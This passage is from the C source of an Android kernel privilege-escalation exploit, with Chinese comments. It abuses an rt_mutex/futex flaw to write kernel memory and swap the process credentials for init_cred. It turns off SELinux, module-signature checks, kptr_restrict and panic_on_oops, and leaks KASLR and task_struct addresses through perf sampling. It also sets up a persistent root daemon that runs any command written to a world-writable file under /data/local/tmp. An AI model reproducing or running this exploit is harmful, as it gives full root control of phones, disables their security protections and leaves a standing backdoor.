         *   ⇒ init_cred.usage 一分不动（既没 get 也没 put）✅
         *
         *   子进程里再调 setresuid/setresgid/execve 都是安全的：
         *   此时 cred == real_cred（同一 slab 副本），BUG_ON 条件不成立。
         *
         *   子进程退出只释放那份副本，与 init_cred 无关。
         *
         * ⚠️ 父进程（本线程）仍然保持 cred=init_cred、real_cred=shell 的
         *    不一致状态 ⇒ 父进程绝不能调 commit_creds 路径（setuid/execve 等），
         *    只能 HOLD 常驻。这是有意为之：父进程活着 = init_cred 引用被持有。
         * ══════════════════════════════════════════════════════════════════ */
        if (g0 == 0) {
            /* ★★★ v110：子进程此时 cred == real_cred（copy_creds 出的同一
             * slab 副本），所以 execve 走 commit_creds 是安全的。
             * 如果给了 g_run_cmd，就直接 exec 成 root shell 执行它，
             * 这样我们有一个真正的 uid=0 shell 来跑 magiskpolicy /
             * setenforce 等工具。exec 失败则退回到 ksu_do_work。 */
            /* ══════════════════════════════════════════════════════════
             * ★★★ v112 关键修正：exec 必须在【新 fork 出来的归一化子进程】里做 ★★★
             *
             * 之前 v110 直接在本进程 execv("/system/bin/sh")，实测炸在：
             *   Kernel BUG at commit_creds+0x264/0x284
             *   lr : install_exec_creds+0x1c/0x60
             *   Call trace: ... load_elf_binary → search_binary_handler
             *               → __do_execve_file → ksu_handle_execve_sucompat
             * → commit_creds → BUG
             *
             * 原因：本进程此刻 cred=&init_cred、real_cred=原 shell cred
             *   （th_waiter 只改了 cred，故意不改 real_cred）。
             *   execve 完成时 install_exec_creds() 会调
             *   commit_creds(bprm->cred)，而 4.19 的 commit_creds 开头就是
             *       BUG_ON(task->cred != task->real_cred);
             *   条件成立 ⇒ 直接 Kernel BUG ⇒ ipanic ⇒ 手机重启。
             *
             * 正确做法：fork()。copy_creds() 会 prepare_creds() 从
             *   current->cred 复制一份全新 slab cred，且
             *       p->cred = p->real_cred = get_cred(new);
             *   ⇒ 子进程的 cred 与 real_cred 指向【同一个对象】，
             *     BUG_ON 条件不成立，execve/setuid 全部安全。
             * ══════════════════════════════════════════════════════════ */
            if (g_run_cmd && g_run_cmd[0] && g_run_cmd[0] != 'x') {
                pid_t cc = fork();
                if (cc == 0) {
                    char *av[4];
                    av[0] = "/system/bin/sh";
                    av[1] = "-c";
                    av[2] = g_run_cmd;
                    av[3] = NULL;
                    execv("/system/bin/sh", av);
                    _exit(127);
                }
                if (cc > 0) {
                    int st = 0;
                    waitpid(cc, &st, 0);
                    dprintf(2, "[v112] cmd child rc=%d\n",
                            WIFEXITED(st) ? WEXITSTATUS(st) : -1);
                }
                /* 本进程 cred != real_cred，绝不 exec；也绝不退出
                 * （退出会 exit_creds() → put_cred(init_cred)，
                 *   把静态对象 usage 递减，累计到 0 就 kmem_cache_free 崩溃）。
                 * 就地 HOLD 住，等于给 init_cred 持一个引用。 */
                for (;;) sleep(30);
            }
            ksu_do_work();
            /* v89 原注：本进程 cred==init_cred、real_cred==shell，两者不一致，
             * 所以绝不能走 commit_creds 路径（setuid/execve）；
             * 但 ksu_do_work 只做 open/read/write/init_module/prctl，
             * 都不碰 commit_creds，可以安全地就地执行。*/
            ksu_do_work();
            _exit(0);

            pid_t rp = fork();
            if (rp < 0) {
                char m[64];
                int k = snprintf(m, sizeof(m),
                                 "[v85] fork failed errno=%d\n", errno);
                if (k > 0)
                    write(2, m, k);
            }
            if (rp == 0) {
                /* ══════════════════════════════════════════════════════
                 * ★★★ v83：把干净 root 子进程改造成【常驻 root 守护进程】★★★
                 *
                 * 为什么必须这样做：
                 *   cred 改写只让"当前这一个进程"变成 root，进程一退就没了。
                 *   而每次触犯用都要消耗一个 slot（一次开机只有十来个），
                 *   所以"一条命令一次利用"完全不实用。
                 *
                 * 但 fork 出来的这个子进程不一样：
                 *   它的 cred 和 real_cred 指向同一个【全新 slab 副本】
                 *   （copy_creds → prepare_creds 从 init_cred memcpy 而来），
                 *   ⇒ 它是真正意义上"正常的 root 进程"：
                 *      · 可以随便 fork / execve / 退出
                 *      · 退出发放时走 cred_jar，不会碰 init_cred
                 *      · 完全不受 commit_creds 的 BUG_ON 约束
                 *
                 * 于是让它常驻，通过文件轮询接受命令：
                 *   写命令 → /data/local/tmp/.glroot/in
                 *   读结果 → /data/local/tmp/.glroot/out
                 *   完成标记 → /data/local/tmp/.glroot/done
                 * 这样就"一次利用，长期可用"。
                 *
                 * ⚠️ 必须 setsid() 脱离原会话/进程组：
                 *   a) timeout(1) 到点会 kill 整个前台进程组，不脱离会被带走；
                 *   b) 关闭 adb/shell 会话发的 SIGHUP 也会打到它。
                 *   fork 出的子进程不是进程组 leader，setsid() 必然成功。
                 *
                 * ⚠️ 这里的 usleep/sleep 都是 syscall，但此时 uid 已经是 0，
                 *   oplus_invoke_syscall 的入口快照 w20==0 ⇒ cbz w20 免检，
                 *   不会再被 uid 差分检测拦。这一点前面已实测确认。
                 * ══════════════════════════════════════════════════════ */

                /* 1) 固化凭据：此时 cred==real_cred，走 commit_creds 安全 */
                syscall(__NR_setresuid, 0, 0, 0);
                syscall(__NR_setresgid, 0, 0, 0);

                /* ★★★ v85：一次性执行模式 ★★★
                 * 有 g_run_cmd 时直接 exec 成 root shell 执行命令，
                 * 不留守护进程 —— 一条命令一次利用，最省事也最不容易卡住。*/
                /* ★★★ v88：不再 exec，直接在本进程内完成全部工作 ★★★ */
                {
                    char mm[80];
                    int k = snprintf(mm, sizeof(mm),
                                     "[v88] root child reached, uid=%d\n",
                                     (int)getuid());
                    if (k > 0)
                        write(2, mm, k);
                }
                ksu_do_work();
                _exit(0);

                /* 2) 脱离会话与进程组，摆脱 timeout / SIGHUP */
                setsid();
                signal(SIGHUP, SIG_IGN);
                signal(SIGINT, SIG_IGN);
                signal(SIGTERM, SIG_IGN);

                /* 3) 准备好通信目录（0777，让 shell 侧能写入命令） */
                const char *GDIR = "/data/local/tmp/.glroot";
                mkdir(GDIR, 0777);
                chmod(GDIR, 0777);
                /* 清掉上一轮的残留，避免误触发 */
                unlink("/data/local/tmp/.glroot/in");
                unlink("/data/local/tmp/.glroot/done");
                unlink("/data/local/tmp/.glroot/out");

                /* 4) 写 pid 文件，方便用户确认/收尾 */
                {
                    FILE *pf = fopen("/data/local/tmp/.glroot/pid", "w");
                    if (pf) {
                        fprintf(pf, "%d\n", (int)getpid());
                        fclose(pf);
                        chmod("/data/local/tmp/.glroot/pid", 0666);
                    }
                }
                /* 5) 写 READY 标记 */
                {
                    FILE *rf = fopen("/data/local/tmp/.glroot/ready", "w");
                    if (rf) {
                        fprintf(rf, "pid=%d uid=%d euid=%d\n",
                                (int)getpid(), (int)getuid(), (int)geteuid());
                        fclose(rf);
                        chmod("/data/local/tmp/.glroot/ready", 0666);
                    }
                }

                /* 6) 主循环：轮询 in 文件 */
                for (;;) {
                    struct stat st;
                    if (stat("/data/local/tmp/.glroot/in", &st) == 0 &&
                        st.st_size > 0) {
                        char cmd[4096];
                        int n = 0;
                        int fd = open("/data/local/tmp/.glroot/in", O_RDONLY);
                        if (fd >= 0) {
                            n = (int)read(fd, cmd, sizeof(cmd) - 1);
                            close(fd);
                        }
                        if (n < 0) n = 0;
                        cmd[n] = '\0';
                        /* 先删 in，保证同一条命令只跑一次 */
                        unlink("/data/local/tmp/.glroot/in");
                        unlink("/data/local/tmp/.glroot/done");

                        /* fork + exec 执行，输出落到 out */
                        pid_t c = fork();
                        if (c == 0) {
                            int ofd = open("/data/local/tmp/.glroot/out",
                                           O_WRONLY | O_CREAT | O_TRUNC, 0666);
                            if (ofd >= 0) {
                                dup2(ofd, 1);
                                dup2(ofd, 2);
                                close(ofd);
                            }
                            execl("/system/bin/sh", "sh", "-c", cmd, (char*)NULL);
                            _exit(127);
                        }
                        int wst = 0;
                        if (c > 0) waitpid(c, &wst, 0);

                        /* 写完成标记（带上退出码） */
                        {
                            int ef = open("/data/local/tmp/.glroot/done",
                                          O_WRONLY | O_CREAT | O_TRUNC, 0666);
                            if (ef >= 0) {
                                char b[64];
                                int m = snprintf(b, sizeof(b), "rc=%d\n",
                                                 c > 0 ? WEXITSTATUS(wst) : -1);
                                ssize_t w2 = write(ef, b, (size_t)m);
                                (void)w2;
                                close(ef);
                            }
                        }
                    }
                    usleep(150000);   /* 150ms 轮询 */
                }
                _exit(0);
            }
            F[6] = (unsigned int)(rp > 0 ? 1u : 0u);   /* 1 = fork 成功 */
        }
    }

printf("[*] probe_done=%d stamped=%d pr_ret=%d/%d\n",
           __atomic_load_n(&g_probe_done, __ATOMIC_ACQUIRE),
           __atomic_load_n(&g_stamped, __ATOMIC_ACQUIRE), pr_ret, pr_err);

    /* ══════════════════════════════════════════════════════════════════════
     * ★★★ v82 第二步判决：cred 指针是否真的被改成了 &init_cred ★★★
     *
     * 判据（从强到弱，全部在同一次运行内取）：
     *   ① getuid()/geteuid() == 0 —— 最直接的证据
     *      原理：getuid() 走 current_uid() = current_cred()->uid，
     *      而 current_cred() = current->cred。main 线程的 task->cred 若已
     *      指向 init_cred（uid 全 0），这里必然返回 0。
     *   ② getresuid 三个都为 0 —— 排除"只有 real uid 变了"的假象
     *   ③ capget 读 effective/permitted —— init_cred 里是 0x3fffffffff
     *      （38 个 capability 全开）。注意 4.19 的 capget 对普通进程
     *      有 _LINUX_CAPABILITY_VERSION_3 的约定，这里只做尽力读取。
     *
     * ⚠️ 这些检查必须在【子进程主线程】里做 —— 被改的是主线程的
     *    task_struct->cred，换到 th_waiter 线程里读会是另一个 cred。
     *    child_body 本身就是子进程主线程，位置正确。
     *
     * ⚠️ 绝不能在写完 cred 后再做 do_stamp —— 那会再触发一次 chain walk，
     *    而 fake_lock->waiters.rb_leftmost 已被本轮写脏 ⇒ 必崩。
     *    这里只做只读检查，不发任何写内核的操作。
     * ══════════════════════════════════════════════════════════════════════ */
    if (g_mode == MODE_CRED) {
        unsigned int ru = 0xdeadbeef, eu = 0xdeadbeef, su = 0xdeadbeef;
        int guid = (int)getuid();
        int geuid = (int)geteuid();
        getresuid(&ru, &eu, &su);

        printf("[v82] ============ CRED 判决 ============\n");
        printf("[v82] getuid()=%d  geteuid()=%d\n", guid, geuid);
        printf("[v82] getresuid = %u / %u / 0x%08x\n", ru, eu, su);
        printf("[v82] target 曾指向 = 0x%lx (task+0x%lx)\n",
               (unsigned long)__atomic_load_n(&g_target_rt, __ATOMIC_ACQUIRE),
               TASK_CRED);

        /* ★ v82f 判据①：uid/euid 全 0 —— 这是核心，走 current_cred()
         * ★ v82f 判据②：suid 的三种可能
         *    · == target>>32 ：固化未生效，仍带着 rb_erase 副作用留下的疤
         *    · == 0          ：固化（setresuid）已把 suid 清成 0，正常
         *    · == 2000       ：原始 shell 值 ⇒ 说明写入根本没发生
         * 前两种都证明"写入发生过且我们知道它做了什么"。 */
        unsigned long tgt_now = (unsigned long)__atomic_load_n(&g_target_rt, __ATOMIC_ACQUIRE);
        unsigned int  tgt_hi  = (unsigned int)(tgt_now >> 32);
        int core_ok = (guid == 0 && geuid == 0);
        int suid_is_side_effect = (su == tgt_hi);
        int suid_cleaned       = (su == 0);
        int suid_untouched     = (su == 2000u);

        printf("[v82] 判据① uid==0 && euid==0 : %s\n", core_ok ? "PASS" : "FAIL");
        printf("[v82] 判据② suid=0x%08x : %s\n", su,
               suid_is_side_effect ? "PASS(rb_erase 疤，固化未生效)" :
               (suid_cleaned ? "PASS(已被 setresuid 清 0)" :
                (suid_untouched ? "FAIL(仍是 2000 ⇒ 写入未发生)" : "异常")));
        printf("[v82] 归一化(fork): %s (F6=%u)\n",
               F[6] ? "OK" : "FAIL(fork 未成功)",
               F[6]);

        if (core_ok) {
            printf("[v82] *** ROOT OK *** task->cred 已指向 init_cred，uid/euid 全 0\n");
            if (suid_is_side_effect)
                printf("[v82] *** 且 suid == target>>32 ⇒ rb_erase 副作用铁证 ***\n");
            printf("[v82] ---- root 权限实测 ----\n");

            /* ★ 决定性探针：sethostname 的 ns_capable 检查
             *   反汇编 __arm64_sys_sethostname（0xffffff8008284794）：
             *     +0x3c bl ns_capable(current->nsproxy->uts_ns->user_ns, CAP_SYS_ADMIN)
             *     +0x40 tbz w0,#0,+0x54  → 无权限返回 -EPERM
             *     +0x44 cmp w19,#0x40    → 有权限才检查 len
             *     +0x4c mov x0,#-22      → len>64 返回 -EINVAL
             *   ns_capable 走 current_cred()（= 我们改的 cred），
             *   而 capget//proc/status 走 __task_cred()（= real_cred）。
             *   传 len=-1：无能力→EPERM(1)，有能力→EINVAL(22)。
             *   完全无副作用（len>64 在任何拷贝之前返回，不改主机名）。 */
            {
                long hr = syscall(__NR_sethostname, "x", 0xFFFFFFFFFFFFFFFFUL);
                int he = errno;
                printf("[v82] sethostname(len=-1) ret=%ld errno=%d (%s)\n",
                       hr, he, he == 22 ? "EINVAL" : (he == 1 ? "EPERM" : "?"));
                if (he == 22)
                    printf("[v82] *** PROOF: EINVAL ⇒ ns_capable(CAP_SYS_ADMIN) 通过 "
                           "⇒ capable() 已全开 ***\n");
                else if (he == 1)
                    printf("[v82] ns_capable 仍拒绝(EPERM) ⇒ capable 未生效\n");
            }
            /* capget：同样走 __task_cred，预期在固化后变 0x3fffffffff */
            {
                struct __user_cap_header_struct { unsigned int version; int pid; };
                struct __user_cap_data_struct { unsigned int effective, permitted, inheritable; };
                struct __user_cap_header_struct hdr;
                struct __user_cap_data_struct dat[2];
                memset(&hdr, 0, sizeof(hdr));
                memset(dat, 0, sizeof(dat));
                hdr.version = 0x20080522;   /* _LINUX_CAPABILITY_VERSION_3 */
                long cr = syscall(__NR_capget, &hdr, dat);
                if (cr == 0) {
                    unsigned long long eff = ((unsigned long long)dat[1].effective << 32) | dat[0].effective;
                    printf("[v82] capget: effective=0x%llx\n", eff);
                    if (eff == 0x3fffffffffULL)
                        printf("[v82] *** CAPS FULL 0x3fffffffff（固化副本生效）***\n");
                } else printf("[v82] capget errno=%d\n", errno);
            }
            /* 真实写测试 */
            {
                const char *p = "/data/local/tmp/gl_root_proof.txt";
                int wfd = open(p, O_WRONLY | O_CREAT | O_TRUNC, 0600);
                if (wfd >= 0) {
                    const char *msg = "gl_v82 root proof\n";
                    ssize_t wn = write(wfd, msg, strlen(msg));
                    close(wfd);
                    printf("[v82] write(proof) = %s (n=%ld)\n", wn > 0 ? "OK" : "FAIL", (long)wn);
                } else printf("[v82] write(proof) FAIL errno=%d\n", errno);
            }
            /* 读 root-only 文件 */
            {
                int fd = open("/data/misc/bluedroid/bt_config.conf", O_RDONLY);
                printf("[v82] open(bt_config.conf) = %s\n", fd >= 0 ? "OK(root 可读)" : "FAIL");
                if (fd >= 0) close(fd);
            }
            printf("[v82] ---- end root proof ----\n");
        } else {
            printf("[v82] *** NOT ROOT *** uid=%d euid=%d，写入未生效\n", guid, geuid);
        }
    }

    /* ★★★ 判决：唯一可信判据 = /sys/fs/selinux/enforce ★★★
     * v77i 起两轮 do_stamp 都直接写真实目标 selinux_state+1（幂等），
     * 不再用 P_ADDR 用户页探针 —— 因为 0x7fcc `str x10,[x8]` 是在
     * 内核态执行的，pstate 带 +PAN，写用户页会立刻 Data abort
     * （v76i 之所以没炸在探针轮，是因为它探针轮 value=1 走了 0x81d4 分支
     *  且 target=P_ADDR，写用户页本应 PAN —— 实测日志里 Oops 发生在
     *  实写轮，说明探针轮根本没跑到，这也解释了为何 v76i 只出现一次 Oops）。
     * enforce 由 1 变 0 即同时证明三件事：
     *   ① chain walk 走通（pi_blocked_on 仍悬空、prio 不等）
     *   ② rb_erase_cached 的 0x7fcc `str x10,[x8]` 提交（任意写成立）
     *   ③ value&~3 != 0 使 0x7fd0 b.eq 不成立 → 走 0x7fe0/ret，
     *      未执行 str x8,[x1] → fake_lock->waiters.rb_root 保持 0
     *      → rt_mutex_enqueue 的 while(*link) 不进入 → 无遍历崩溃 */
    {
        int enf_now = read_enforce();
        int sig_now = read_sig_enforce();
        printf("[*] VERDICT(enforce): %d -> %s\n",
               enf_now,
               enf_now == 0 ? "*** PERMISSIVE ***" :
               (enf_now == 1 ? "STILL-ENFORCING (write not reached)" : "READ-FAILED"));
        printf("[*] VERDICT(sig_enforce): %c -> %s\n",
               sig_now < 0 ? '?' : (sig_now ? 'Y' : 'N'),
               sig_now < 0 ? "NOT-READABLE (Enforcing 下 shell 无权读, 正常)" :
               (sig_now == 0 ? "*** UNSIGNED MODULE ALLOWED ***" : "STILL FORCED"));
        /* ★ v81：kptr_restrict / panic_on_oops 判决 */
        {
            int kptr_now  = read_kptr();
            int panic_now = read_panic_oops();
            printf("[*] VERDICT(kptr_restrict): %d -> %s\n",
                   kptr_now,
                   kptr_now == 0 ? "*** /proc/kallsyms PLAINTEXT ***" :
                   (kptr_now < 0 ? "READ-FAILED" : "STILL-RESTRICTED"));
            printf("[*] VERDICT(panic_on_oops): %d -> %s\n",
                   panic_now,
                   panic_now == 0 ? "*** OOPS WON'T REBOOT ***" :
                   (panic_now < 0 ? "READ-FAILED" : "STILL-PANICS"));
        }
        if (enf_now == 0 && sig_now == 0)
            printf("[*] *** BOTH OPEN: insmod unsigned module will work ***\n");
    }
    printf("[*] diag: F0=0x%08x F1=0x%08x F2=0x%08x\n",
           F[F_CHAIN], F[F_TARGET], F[F_WAIT]);
    printf("[*] diag: o_lock=%ld/%ld w_wait=%ld/%ld w_held=%d\n",
           o_lock_ret, o_lock_err, w_wait_ret, w_wait_err, w_held);
    printf("[*] diag: stamp_enter=%ld stamp_exit=%ld snd_ret=%ld\n",
           stamp_enter, stamp_exit, snd_ret);
    printf("[*] diag: stamp_us=%ld probe_us=%ld delta_us=%ld\n",
           g_dbg_stamp_us, g_dbg_probe_us, g_dbg_probe_us - g_dbg_stamp_us);
    printf("[*] diag: enforce_before=%d enforce_now=%d\n",
           g_enf_before, read_enforce());

    /* ══════════════════════════════════════════════════════════════════
     * ★★★ v78i：进程【绝不退出】，原地常驻 ★★★
     *
     * 为什么不能 return 0（也不能 _exit）：
     *   th_waiter 走了 handle_early_requeue_pi_wakeup → goto out_put_keys
     *   这条路径【绕过】rt_mutex_cleanup_proxy_lock ⇒
     *     ① th_waiter->pi_blocked_on 仍指向它自己内核栈上的 rt_waiter
     *     ② 该 rt_waiter 仍挂在 F_WAIT 的 pi_state->pi_mutex 红黑树里
     *   一旦本进程退出，th_waiter 的 vmap 内核栈被 free ⇒
     *   第 ② 项那个树节点立刻变成 UAF 指针，任何后续 rt_mutex 操作
     *   （哪怕别的进程碰巧用到同一块内存/同一 pi_state）都可能踩到，
     *   表现为我们无法归因的新 Oops —— 会污染"是否 Panic"这个硬判据。
     *
     *   所以判决打印完就常驻：让那块栈永远有效，把不确定性锁死在
     *   一个已完成的、不再被触碰的状态里。
     *
     * 读结果：cat /sys/fs/selinux/enforce  （应为 0）
     * 收尾  ：kill -9 <pid>（此时 enforce 已落地，进程残留已无意义） */
    printf("[*] HOLD: enforce=%d, process kept alive on purpose.\n", read_enforce());
    printf("[*] HOLD: read it with  cat /sys/fs/selinux/enforce\n");
    printf("[*] HOLD: then  kill -9 %d\n", (int)getpid());
    fflush(stdout);

    /* ★★★ v83：HOLD 期间必须忽略 SIGHUP/SIGINT/SIGTERM ★★★
     * 原因：本进程的 task->cred = init_cred，而 real_cred 仍是 shell cred。
     *   一旦它意外退出，exit_creds() 会 put_cred(init_cred)，
     *   把静态对象的 usage 递减 1（初值 4）。累计 4 次就崩。
     *   关闭 adb/aShellYou 会话时终端会发 SIGHUP，
     *   默认动作是终止进程 —— 必须挡住。
     *   SIGHUP 之外，timeout(1) 超时会发 SIGTERM，也一起挡。 */
    signal(SIGHUP,  SIG_IGN);
    signal(SIGINT,  SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);
    for (;;) sleep(30);
    return 0;
}

/* ── perf KASLR 泄露（pju110_leak 核心，只读采样，不触发 futex）── */
#define KVA_MIN 0xffffff8000000000ULL

static uint64_t ring_u64(const uint8_t *ring, uint64_t size, uint64_t pos) {
    uint64_t v, off = pos & (size - 1);
    if (off + 8 <= size) {
        memcpy(&v, ring + off, 8);
    } else {
        uint8_t b[8];
        uint64_t first = size - off;
        memcpy(b, ring + off, first);
        memcpy(b + first, ring, 8 - first);
        memcpy(&v, b, 8);
    }
    return v;
}

static uint64_t leak_text_base(void) {
    struct perf_event_attr a;
    memset(&a, 0, sizeof(a));
    a.type = PERF_TYPE_SOFTWARE;
    a.size = sizeof(a);
    a.config = PERF_COUNT_SW_CPU_CLOCK;
    a.sample_period = 100000;
    a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN;
    a.sample_max_stack = 32;
    a.disabled = 1;
    a.exclude_hv = 1;

    int fd = syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
    if (fd < 0) {
        fprintf(stderr, "[-] perf_event_open failed: %s\n", strerror(errno));
        return 0;
    }

    long ps = sysconf(_SC_PAGESIZE);
    size_t map_size = (size_t)ps * 33;
    struct perf_event_mmap_page *m = mmap(NULL, map_size,
        PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (m == MAP_FAILED) {
        fprintf(stderr, "[-] perf mmap failed\n");
        close(fd);
        return 0;
    }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (int i = 0; i < 30000; i++) syscall(__NR_gettid);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    __sync_synchronize();

    uint64_t head = m->data_head, tail = m->data_tail;
    uint64_t min = UINT64_MAX;
    uint8_t *ring = (uint8_t *)m + m->data_offset;
    uint64_t rs = m->data_size;
    int nsamples = 0;

    while (tail + sizeof(struct perf_event_header) <= head) {
        struct perf_event_header h;
        uint64_t off = tail & (rs - 1);
        if (off + sizeof(h) <= rs) memcpy(&h, ring + off, sizeof(h));
        else {
            uint8_t b[sizeof(h)]; size_t first = rs - off;
            memcpy(b, ring + off, first);
            memcpy(b + first, ring, sizeof(h) - first);
            memcpy(&h, b, sizeof(h));
        }
        if (h.size < sizeof(h) || tail + h.size > head) break;

        if (h.type == PERF_RECORD_SAMPLE) {
            uint64_t pos = tail + sizeof(h);
            uint64_t ip = ring_u64(ring, rs, pos); pos += 16;
            uint64_t nr = ring_u64(ring, rs, pos); pos += 8;
            nsamples++;
            if (ip >= KVA_MIN && ip < min) min = ip;
            for (uint64_t i = 0; i < nr && pos + 8 <= tail + h.size; i++) {
                uint64_t x = ring_u64(ring, rs, pos); pos += 8;
                if (x >= KVA_MIN && x < min) min = x;
            }
        }
        tail += h.size;
    }

    munmap(m, map_size);
    close(fd);

    printf("[*] perf samples=%d min_kva=0x%016llx\n", nsamples, (unsigned long long)min);
    if (min == UINT64_MAX) return 0;

    uint64_t image_base = min & ~0x1fffffULL;
    uint64_t text_base = image_base + TEXT_OFFSET;
    printf("[*] image_base=0x%016llx (2MB 对齐), _text=0x%016llx\n",
           (unsigned long long)image_base, (unsigned long long)text_base);
    return text_base;
}

static int solve_kaslr(void) {
    uint64_t base = leak_text_base();
    if (!base) {
        fprintf(stderr, "[-] KASLR 泄漏失败\n");
        return -1;
    }

    /* 严格校验：_text 必须落在 39-bit 内核区间 0xffffff80.. - 0xffffffff.. */
    if (base < 0xffffff8000000000ULL || base > 0xffffffffffffffffULL) {
        fprintf(stderr, "[-] _text 0x%lx 超出内核地址范围，拒绝使用\n", (unsigned long)base);
        return -1;
    }

    g_slide = base - LINK_TEXT;
    /* slide 必须是 2MB 对齐（_text 本身带 0x80000 偏移，不对齐是正常的） */
    if (g_slide & 0x1fffffULL) {
        fprintf(stderr, "[-] slide 0x%lx 未按 2MB 对齐，拒绝使用\n", g_slide);
        return -1;
    }
g_selinux_state_rt = SELINUX_STATE_S + g_slide;
    g_selinux_enf_rt   = g_selinux_state_rt + 1;
    g_empty_zero_rt    = EMPTY_ZERO_S + g_slide;
    g_init_task_rt     = INIT_TASK_S + g_slide;
    g_scr_rt           = BSS_SCRATCH_S + g_slide;
    /* ★ v79i：模块签名强制开关（1 字节 bool），清零后未签名模块可加载 */
    g_sig_enf_rt       = SIG_ENFORCE_S + g_slide;
    g_kptr_rt          = KPTR_RESTRICT_S + g_slide;
    g_panic_oops_rt    = PANIC_ON_OOPS_S + g_slide;
    /* 第 1 阶段目标：先关 SELinux（这是 v78i 已验证成功的写） */
    g_target_rt        = g_selinux_enf_rt;


    /* ★★★ v77i：伪造 rt_mutex / 假 task / value 全部落在 bm_pmd ★★★
     *
     * 为什么弃用 empty_zero_page：
     *   它是 mm 里所有匿名只读映射的"零页"源页。往它里面写字节，
     *   等于把全系统所有进程的匿名零页内容改掉，是整机级污染。
     *   而 bm_pmd（0xffffff800ae4d000）只在 start_kernel 极早期被
     *   early_fixmap_init() 安装成 fixmap 的 PMD 表，此后只读 [0] 项
     *   （源码里那条 BUILD_BUG_ON 保证整个 fixmap 落在同一 PMD 项内），
     *   [1..511] 即 +0x08..+0xFFF 是"零且永不访问"的 4KB 全零页。
     *
     * 布局（全部 >= +0x08，全部同页，互不重叠）：
     *   scr+0x040  fake_lock #1   +0x00 wait_lock / +0x08 rb_root
     *                             +0x10 rb_leftmost / +0x18 owner，全零
     *              同一地址兼作假 task_struct：+0x20 state=0（try_to_wake_up 早退）
     *                                        +0x84C pi_lock（lock/unlock 配对）
     *   scr+0x0C0  fake_lock #2   必须与 #1 不同地址，理由见 th_waiter 注释
     *   scr+0x800  value & ~3 的落点：+0x10 全零可读，
     *              +0x08 可写（0x7fe0 str x8,[x9,#8]）
     *              byte0 = 0x00 ⇒ 写进 enforcing 就是 0 */
    g_fake_lock        = g_scr_rt + g_slot;

    printf("[*] slide = 0x%lx\n", g_slide);
    printf("[*] selinux_state = 0x%lx, enforcing = 0x%lx\n",
           g_selinux_state_rt, g_selinux_enf_rt);
    printf("[*] scr(bm_pmd) = 0x%lx  lock1=0x%lx lock2=0x%lx value=0x%lx\n",
           g_scr_rt, g_scr_rt + SCR_LOCK1, g_scr_rt + SCR_LOCK2,
           g_scr_rt + SCR_VALUE);
    printf("[*] empty_zero_page = 0x%lx, init_task = 0x%lx\n",
           g_empty_zero_rt, g_init_task_rt);
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════════
 * ★★★ v82：在当前线程内泄漏 current->task_struct 内核地址 ★★★
 *
 * ── 原理（反汇编铁证，见文件头 LINK_COMMIT_CREDS）──
 *   commit_creds:
 *     +0x00  stp x29,x30,[sp,#-48]!
 *     +0x04  str x21,[sp,#16]
 *     +0x08  stp x20,x19,[sp,#32]
 *     +0x0c  mrs x20, sp_el0          ← 此后 x20 = current (task_struct *)
 *     +0x10  ldr x19,[x20,#1888]      ← real_cred
 *     +0x14  ldr x8, [x20,#1896]      ← cred
 *   ⇒ 只要 perf 采样点落在 [+0x10, +0x100) 窗口内，采到的 x20 就是
 *      【本线程】的 task_struct 指针。窗口下界必须是 +0x10，不能是 +0。
 *
 * ── 为什么可信：三重反伪证（全部已实测）──
 *   ① 运行内一致：同一轮多次命中，x20 完全相同（8/8、16/16、9/9…）
 *   ② 跨运行不同：三次运行得 fd7b4200 / eab62100 / d4a88000
 *      ⇒ 排除 init_task 这类静态全局（那个带 slide 后每台固定）
 *   ③ 同进程跨线程不同：两线程差 0x1080
 *      ⇒ 排除 signal_struct / mm_struct（进程级共享，跨线程必然相同）
 *   反证：commit_creds 自身 `ldr x19,[x20,#1888]` 若能正常跑，
 *      说明 x20 必然指向合法 task_struct ⇒ 用该偏移反推也对得上。
 *
 * ── 触发方式 ──
 *   setuid(getuid()) 每次都会 prepare_creds() + commit_creds()。
 *   sample_period=2000（CPU clock 周期），exclude_user=1 使计数只在
 *   内核态累加 ⇒ 采样点自然密集落在系统调用密集区。
 *
 * ── 为什么必须在本线程调用 ──
 *   perf_event_open(pid=0) 采样的就是【调用者所在线程】。
 *   task_struct 是 per-thread 的，主线程与工作线程拿到的是两个不同对象
 *   （实测相差 0x1080）。所以要写谁的 cred 就得在谁的线程里泄漏。
 * ══════════════════════════════════════════════════════════════════════════ */
static unsigned long leak_task_in_thread(unsigned long cc_rt, int *out_hits) {
    struct perf_event_attr a;
    int fd;
    void *mp;
    long ps;
    size_t msz;
    struct perf_event_mmap_page *m;
    uint64_t head, tail, rs;
    uint8_t *ring;
    unsigned long cand[64];
    int nc = 0, hits = 0, nsamp = 0;

    if (out_hits) *out_hits = 0;

    memset(&a, 0, sizeof(a));
    a.type = PERF_TYPE_SOFTWARE;
    a.size = sizeof(a);
    a.config = PERF_COUNT_SW_CPU_CLOCK;
    a.sample_period = 2000;
    a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
    a.sample_regs_intr = (1ULL << 32) - 1;   /* x0..x30 + sp + pc，实测可接受 */
    a.disabled = 1;
    a.exclude_user = 1;      /* 只统计内核态 —— 让采样点集中在内核路径 */
    a.exclude_kernel = 0;
    a.exclude_hv = 1;
    a.wakeup_events = 1;

    fd = (int)syscall(__NR_perf_event_open, &a, 0, -1, -1, 0);
    if (fd < 0) {
        printf("[!] leak: perf_event_open errno=%d (%s)\n", errno, strerror(errno));
        return 0;
    }

    ps  = sysconf(_SC_PAGESIZE);
    msz = (size_t)ps * 33;    /* 必须 pg*(1+2^n)，实测 pg*33 可用、pg*64 报 EINVAL */
    mp  = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mp == MAP_FAILED) {
        printf("[!] leak: perf mmap errno=%d\n", errno);
        close(fd);
        return 0;
    }
    m = (struct perf_event_mmap_page *)mp;

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    {
        uid_t u = getuid();
        for (int i = 0; i < 1200; i++) setuid(u);
    }
